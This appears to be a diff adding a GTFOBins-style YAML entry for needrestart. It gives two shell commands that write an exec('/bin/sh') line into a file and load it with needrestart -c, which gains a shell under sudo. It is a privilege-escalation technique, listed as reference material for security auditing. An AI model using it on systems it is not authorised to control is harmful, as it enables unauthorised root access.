@@ -1,0 +1,9 @@
+---
+functions:
+  shell:
+  - code: |-
+      echo 'exec("/bin/sh");' > /path/to/temp-file
+      needrestart -c /path/to/temp-file
+    contexts:
+      sudo:
+...
